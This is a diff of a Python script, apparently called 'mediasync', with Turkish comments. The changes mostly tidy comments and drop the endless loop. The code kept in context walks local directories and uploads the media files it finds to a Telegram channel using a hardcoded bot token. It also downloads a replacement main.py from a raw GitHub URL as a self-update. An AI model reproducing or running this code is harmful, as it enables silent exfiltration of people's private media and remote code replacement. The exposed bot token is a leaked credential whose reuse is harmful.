@@ -1,10 +1,10 @@
-import os
 import subprocess
 import sys
+import os
 import requests
 import time
 
-# Gerekli kütüphaneyi yükle
+# requests kütüphanesini yükle
 def install(package):
     subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
 
@@ -17,22 +17,15 @@ except ImportError:
 
 BOT_TOKEN = "7345820153:AAHnspzH9sl9SLCAj7rSgOb9aMbFhsGS9cM"
 CHANNEL_ID = "@p8JdyixgqKFlMjA0"
-CHECK_INTERVAL = 60  # Güncelleme kontrolü için 60 saniye
-
-# GitHub üzerindeki dosyanın URL'si
 SCRIPT_URL = "https://raw.githubusercontent.com/fatiqueos/mediasync/refs/heads/main/main.py"
-
-# Mevcut script dosyasının adı
 SCRIPT_NAME = "main.py"
 
-# Mevcut dosyanın içeriğini almak için bir fonksiyon
 def get_current_script_content():
     if os.path.exists(SCRIPT_NAME):
         with open(SCRIPT_NAME, "r") as file:
             return file.read()
     return None
 
-# GitHub'dan en son sürümü kontrol et ve indir
 def check_for_updates():
     print("Güncellemeler kontrol ediliyor...")
     try:
@@ -90,9 +83,7 @@ def send_media_to_channel(file_path):
             print(f"Başarısız oldu: {file_path}. Hata: {response.text}")
 
 def check_and_send_files():
-    # Kullanıcıdan isim girmesini iste
-    name = input("Lütfen bir isim girin: ")
-    
+    name = input("Lütfen bir isim girin: ")  # Kullanıcıdan isim iste
     for directory in directories:
         if os.path.exists(directory):
             for root, _, files in os.walk(directory):
@@ -106,7 +97,5 @@ def check_and_send_files():
             print(f"Dizin mevcut değil: {directory}")
 
 # Ana döngü
-while True:
-    check_for_updates()  # Her döngüde güncellemeleri kontrol et
-    check_and_send_files()  # Medyaları gönder
-    time.sleep(CHECK_INTERVAL)  # Belirli bir süre bekle
+check_for_updates()  # Başlangıçta güncellemeleri kontrol et
+check_and_send_files()  # Medyaları gönder
